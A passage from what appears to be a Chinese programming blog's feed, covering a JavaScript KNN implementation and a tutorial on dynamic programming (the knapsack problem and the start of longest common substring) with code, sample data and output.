class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnDetail) <span class="keyword">return</span> &#123; res, common &#125;;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 算法-KNN-毕达哥拉斯比较距离</span></span><br><span class="line"><span class="comment">// 传参：对象集合，当前对象，是否返回详细结果（默认否）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kNN</span>(<span class="params">objs, newObj, returnDetail = <span class="literal">false</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> allDistance = []; <span class="comment">//存储所有距离</span></span><br><span class="line">  <span class="keyword">let</span> minDistance = <span class="title class_">Number</span>.<span class="property">MAX_VALUE</span>; <span class="comment">//存储最小距离,默认js能读的最大数值</span></span><br><span class="line">  <span class="keyword">let</span> minObjName; <span class="comment">//存储最小对象名</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> objs) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">pythagoras</span>(objs[key], newObj); <span class="comment">//对每个对象执行毕达哥拉斯公式</span></span><br><span class="line">    allDistance.<span class="title function_">push</span>(&#123; <span class="attr">distance</span>: res, <span class="attr">targetName</span>: key &#125;); <span class="comment">//将所有结果压入</span></span><br><span class="line">    <span class="comment">// res &lt; minDistance &amp;&amp; ((minDistance = res), (minObjName = key));</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历查找最小距离对象</span></span><br><span class="line">  <span class="keyword">let</span> resultObj = allDistance.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">distance</span> - b.<span class="property">distance</span>)[<span class="number">0</span>];</span><br><span class="line">  minObjName = resultObj[<span class="string">&#x27;targetName&#x27;</span>];</span><br><span class="line">  minDistance = resultObj[<span class="string">&#x27;distance&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnDetail) <span class="keyword">return</span> &#123; allDistance, minDistance, minObjName &#125;;</span><br><span class="line">  <span class="keyword">return</span> minObjName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模拟数据以及测试"><a href="#模拟数据以及测试" class="headerlink" title="模拟数据以及测试"></a>模拟数据以及测试</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="comment">//数据库已有用户及其喜欢的电影类型的打分</span></span><br><span class="line"><span class="keyword">let</span> favoriteType = &#123;</span><br><span class="line">  <span class="attr">xiaoming</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">xiaohong</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">xiaolv</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">4</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">xiaozi</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">4</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">xiaoqi</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">5</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">xiaoquan</span>: &#123;</span><br><span class="line">    <span class="attr">terror</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">comedy</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">love</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">scienceFiction</span>: <span class="number">5</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = <span class="title function_">kNN</span>(favoriteType, &#123; <span class="attr">terror</span>: <span class="number">1</span>, <span class="attr">comedy</span>: <span class="number">4</span>, <span class="attr">love</span>: <span class="number">2</span>, <span class="attr">action</span>: <span class="number">5</span>, <span class="attr">scienceFiction</span>: <span class="number">5</span> &#125;, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">allDistance</span>: [</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;4.12&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaoqi&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;4.36&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaozi&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;5.00&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaohong&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;5.10&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaoquan&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;5.20&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaolv&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">&#x27;6.78&#x27;</span>, <span class="attr">targetName</span>: <span class="string">&#x27;xiaoming&#x27;</span> &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">minDistance</span>: <span class="string">&#x27;4.12&#x27;</span>,</span><br><span class="line">  <span class="attr">minObjName</span>: <span class="string">&#x27;xiaoqi&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221222005339.png" alt="image-20220221222005339"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>KNN用于分类和回归，需要考虑最近的邻居。</li><li>分类就是编组。 </li><li>回归就是预测结果（如数字）。 </li><li>特征抽取意味着将物品（如水果或用户）转换为一系列可比较的数字。 </li><li>能否挑选合适的特征事关KNN算法的成败</li></ol>]]></content>
    
    <summary type="html">
    
      KNN（K- Nearest Neighbor）法即K最邻近法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>动态规划</title>
    <link href="http://dong-666.github.io/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>http://dong-666.github.io/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</id>
    <published>2022-02-13T08:00:00.000Z</published>
    <updated>2022-03-02T07:59:49.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>动态规划算法通常用于求解具有某种最优性质的问题。在这类问题中，可能会有许多可行解。每一个解都对应于一个值，我们希望找到具有最优值的解。动态规划算法与分治法类似，其基本思想也是将待求解问题分解成若干个子问题，先求解子问题，然后从这些子问题的解得到原问题的解。</p><p>与分治法不同的是，适合于用动态规划求解的问题，经分解得到子问题往往不是互相独立的。若用分治法来解这类问题，则分解得到的子问题数目太多，有些子问题被重复计算了很多次。如果我们能够保存已解决的子问题的答案，而在需要时再找出已求得的答案，这样就可以避免大量的重复计算，节省时间。</p><p>我们可以用一个表来记录所有已解的子问题的答案。不管该子问题以后是否被用到，只要它被计算过，就将其结果填入表中。这就是动态规划法的基本思路。具体的动态规划算法多种多样，但它们具有相同的填表格式</p></blockquote><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221172703812.png" alt="image-20220221172703812"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180313039.png" alt="image-20220221180313039"></p><p>解决方式就是采用动态规划</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180638182.png" alt="image-20220221180638182"></p><p>背包分割的最小重量取决于能拿的最小物品重量，如果此时最小物品为0.5，那么背包就要被划分成4/0.5 = 8，8列</p><p>在每一行， <strong>可偷的商品都为当前行的商品以及之前各行的商品</strong>，逐行进行计算，比如第一行，可拿的物品只有吉他，那么接下来四格，就都只能考虑吉他，所以全都填充为单个吉他的价值，等到第二行时，可选的选项就有音响和前一行的吉他了，这时候每个单元格再根据物品价值和质量综合判断来进行数据填充，音响重量有4，所以前面依旧沿用吉他的价值，直接到音响的重量所处格子，这时候我们发现音响价值在4的时候大于1500，也就是音响本身价值大于吉他，所以进行替换，接下来亦是如此，到第三行第四个格子我们发现笔记本电脑的价格加上<strong>上一行</strong>4-笔记本重量所处单元格的价值大于上一行4所处价值，所以得出最终的结果</p><p>计算结果如下</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180723661.png" alt="image-20220221180723661"></p><p>计算每个单元格的价值时，使用的公式如下</p><p>在1和2之间进行比较，选择大的那方</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221182208929.png" alt="image-20220221182208929"></p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol><li><p><strong>各行的排列顺序无关紧要</strong></p><p>也就是说哪个物品先判断都行，你想把音响放在最开始进行分析都可以，不影响结果（但在后面的代码中为了方便我还是会为数据进行排序，从最轻的拿起，可以思考下我为什么那样做，当然也有可能会是我想不到（不足）的地方（怕打脸哈哈哈））</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183039104.png" alt="image-20220221183039104"></p></li><li><p><strong>使用动态规划时，要么考虑拿走整件商品，要么考虑不拿，而没法判断该不该拿走商品的一部分（你只能把它当作一个最小的整体，不能继续分割的整体）</strong></p><p>如果想处理像偷大米、黄豆之类可以拆出来倒到背包的问题时，则可以使用贪婪算法</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183404146.png" alt="image-20220221183404146"></p></li><li><p>相互依赖的情况</p><p>没办法建模。动态规划功能强大，它能够解决子问题并使用这些答案来解决大问题。但仅当每个子问题都是<strong>离散</strong>的，即不依赖于其他子问题时，动态规划才管用。这意味着使用动态规划算法解决不了子问题会相互产生影响的问题</p></li><li><p>为获得前述背包问题的最优解，可能需要偷两件以上的商品。但根据动态规划算法的设计，最多只需合并两个子背包，即根本不会涉及两个以上的子背包。不过这些子背包可能又包含子背包</p><p>形象来说就是一分为二，再在每个子背包中一分为二（有点类似二叉树）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221183745856.png" alt="image-20220221183745856"></p></li><li><p>最优解可能会导致背包没装满</p><p>假设你还可以偷一颗钻石。 这颗钻石非常大，重达3.5磅，价值100万美元，比其他商品都值钱得多。 你绝对应该把它给偷了！但当你这样做时，余下的容量只有0.5磅，别的什么都装不下</p></li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>思路如下</p><ol><li>因为从上面的算法得出：每次计算当前行都只会用到上一行的数据，所以我并没有像书里一样使用表格去记录这个过程，我使用了两个二维数组prices、goods分别用来存储每格的价值和所含物品，每次每行计算后的最新结果goods[1]会重新赋值给goods[0]，计算前又将goods[0]默认赋值给goods[1]，这样就可以只在价格有改变时改变单元格即可， prices同理</li><li>然后对初始数据initData进行排序，这样可以保证最开始那一行是有数据的，如果是别的比较重的物品，则最开始那几个空格就会为空，就又要去做一些多余的判断或者赋默认值，挺麻烦的，怕代码冗余和出现一些问题</li><li>内层（列）遍历，每次都只用从当前物品重量对应单元格开始算，毕竟前几格你也放不下嘛，默认当前格的上一行值即可，减少代码判断</li><li>核心判断语句不变，跟上面一致</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 深拷贝函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyDeep</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//算法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dynamicToGetGoods</span>(<span class="params">data, bagWeight</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> initData = <span class="title class_">Array</span>.<span class="title function_">from</span>(data); <span class="comment">//数据初始化，防止修改到原数据</span></span><br><span class="line">  <span class="keyword">let</span> prices = [[], []]; <span class="comment">//存放价值的数组</span></span><br><span class="line">  <span class="keyword">let</span> goods = [[], []]; <span class="comment">//存放每个最大价值所含物品</span></span><br><span class="line">  initData.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">weight</span> - b.<span class="property">weight</span>); <span class="comment">//数据初始化排序，从小到大</span></span><br><span class="line">  <span class="keyword">let</span> baseWeight = initData[<span class="number">0</span>][<span class="string">&#x27;weight&#x27;</span>]; <span class="comment">//获得基础容量</span></span><br><span class="line">  <span class="keyword">let</span> pricesLength = <span class="title class_">Math</span>.<span class="title function_">floor</span>(bagWeight / baseWeight); <span class="comment">//获得背包应分割的数量,向下取整，排除书包额外容量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数据,相当于遍历第一件商品</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; pricesLength; i++) &#123;</span><br><span class="line">    prices[<span class="number">0</span>].<span class="title function_">push</span>(initData[<span class="number">0</span>][<span class="string">&#x27;price&#x27;</span>]);</span><br><span class="line">    goods[<span class="number">0</span>].<span class="title function_">push</span>([initData[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 删除当前商品，避免参与下面的算法执行</span></span><br><span class="line">  <span class="keyword">delete</span> initData[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心，从第二件商品开始遍历，对每一件商品进行数据填充</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> initData) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = initData[key];</span><br><span class="line">    <span class="keyword">let</span> elementWeightIndex = element[<span class="string">&#x27;weight&#x27;</span>] / baseWeight - <span class="number">1</span>; <span class="comment">//物品重量对应索引</span></span><br><span class="line"></span><br><span class="line">    prices[<span class="number">1</span>] = <span class="title function_">copyDeep</span>(prices[<span class="number">0</span>]); <span class="comment">//默认从上一行取值</span></span><br><span class="line">    goods[<span class="number">1</span>] = <span class="title function_">copyDeep</span>(goods[<span class="number">0</span>]); <span class="comment">//默认从上一行取值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = elementWeightIndex; i &lt; pricesLength; i++) &#123;</span><br><span class="line">      <span class="comment">//第一种情况：当前物品重量同当前背包小格重量相等</span></span><br><span class="line">      <span class="keyword">if</span> (i == elementWeightIndex) &#123;</span><br><span class="line">        <span class="comment">// 如果当前物品价格大于先前价格</span></span><br><span class="line">        <span class="keyword">if</span> (element[<span class="string">&#x27;price&#x27;</span>] &gt; prices[<span class="number">0</span>][i]) &#123;</span><br><span class="line">          <span class="comment">// 赋值为当前物品及价格</span></span><br><span class="line">          prices[<span class="number">1</span>][i] = element[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">          goods[<span class="number">1</span>][i] = [element[<span class="string">&#x27;name&#x27;</span>]];</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二种情况，当前物品重量大于当前背包小格重量</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; elementWeightIndex) &#123;</span><br><span class="line">        <span class="comment">// 如果当前物品价格加上（当前背包质量-当前物品质量）的价格大于先前价格</span></span><br><span class="line">        <span class="keyword">if</span> (element[<span class="string">&#x27;price&#x27;</span>] + prices[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>] &gt; prices[<span class="number">0</span>][i]) &#123;</span><br><span class="line">          <span class="comment">// 赋值为当前物品和（当前背包质量-当前物品质量）的物品总和及价格总和</span></span><br><span class="line">          prices[<span class="number">1</span>][i] = element[<span class="string">&#x27;price&#x27;</span>] + prices[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>];</span><br><span class="line">          goods[<span class="number">1</span>][i] = [element[<span class="string">&#x27;name&#x27;</span>], ...goods[<span class="number">0</span>][i - elementWeightIndex - <span class="number">1</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    prices[<span class="number">0</span>] = <span class="title function_">copyDeep</span>(prices[<span class="number">1</span>]);</span><br><span class="line">    goods[<span class="number">0</span>] = <span class="title function_">copyDeep</span>(goods[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">goods</span>: goods[<span class="number">1</span>][pricesLength - <span class="number">1</span>],</span><br><span class="line">    <span class="attr">price</span>: prices[<span class="number">1</span>][pricesLength - <span class="number">1</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下"><a href="#运行下" class="headerlink" title="运行下"></a>运行下</h4><p>模拟数据有点多，不要介意，确保可靠嘛</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;吉他&#x27;</span>, <span class="attr">price</span>: <span class="number">1500</span>, <span class="attr">weight</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;音响&#x27;</span>, <span class="attr">price</span>: <span class="number">3000</span>, <span class="attr">weight</span>: <span class="number">4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;笔记本电脑&#x27;</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;iphone&#x27;</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;ipad&#x27;</span>, <span class="attr">price</span>: <span class="number">2000</span>, <span class="attr">weight</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;自行车&#x27;</span>, <span class="attr">price</span>: <span class="number">50000</span>, <span class="attr">weight</span>: <span class="number">15</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;钻石&#x27;</span>, <span class="attr">price</span>: <span class="number">50000</span>, <span class="attr">weight</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;花&#x27;</span>, <span class="attr">price</span>: <span class="number">50</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;巧克力&#x27;</span>, <span class="attr">price</span>: <span class="number">500</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;耳机&#x27;</span>, <span class="attr">price</span>: <span class="number">1500</span>, <span class="attr">weight</span>: <span class="number">0.5</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = <span class="title function_">dynamicToGetGoods</span>(data, <span class="number">10</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; goods: [ &#x27;音响&#x27;, &#x27;钻石&#x27;, &#x27;iphone&#x27;, &#x27;吉他&#x27;, &#x27;耳机&#x27;, &#x27;巧克力&#x27; ], price: 58500 &#125;</span><br></pre></td></tr></table></figure><h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ol><li>动态规划可帮助你在给定约束条件下找到最优解。在背包问题中，你必须在背包容量给定的情况下，偷到价值最高的商品。</li><li>在问题可分解为彼此独立且离散的子问题时，就可使用动态规划来解决。 </li><li>每种动态规划解决方案都涉及网格</li><li>单元格中的值通常就是你要优化的值。在前面的背包问题中，单元格的值为商品的价值。</li><li>每个单元格都是一个子问题，因此你应考虑如何将问题分成子问题，这有助于你找出网格的坐标轴</li></ol><p>每次用的时候问问自己</p><blockquote><ol><li>单元格中的值是什么？</li><li>如何将这个问题划分为子问题？ </li><li>网格的坐标轴是什么？</li></ol></blockquote><h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><ol><li>建立表格</li><li>确定每一个格的值代表什么 </li><li>如何将大问题划分为具有相同解法的子问题</li><li>确定网格坐标轴</li></ol><h2 id="最长公共子串"><a href="#最长公共子串" class="headerlink" title="最长公共子串"></a>最长公共子串</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185431847.png" alt="image-20220221185431847"></p><p>尝试一下，在纸上绘制网格，将每个单词分解（子问题）</p><p>答案如下（思考下，这是如何得出的）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185929563.png" alt="image-20220221185929563"></p><p>解决这个问题核心的伪代码类似于下面这样</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221185552675.png" alt="image-20220221185552675"></p><h3 id="注意！！！"><a href="#注意！！！" class="headerlink" title="注意！！！"></a>注意！！！</h3><ol><li><p>对于最长公共子串问题，答案为网格中最大的数字——它可能并不位于最后的单元格中</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190054121.png" alt="image-20220221190054121"></p></li></ol><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>你可以先尝试着根据上面的思路自己写一下</p><p>在写的过程中你是否会发现一个问题，在代码的实现上，我们会发现上面的公式会有些问题，毕竟我们是用二维数组去记录这个过程，所以某些情况下会出现<code>data[index1 - 1][index2 - 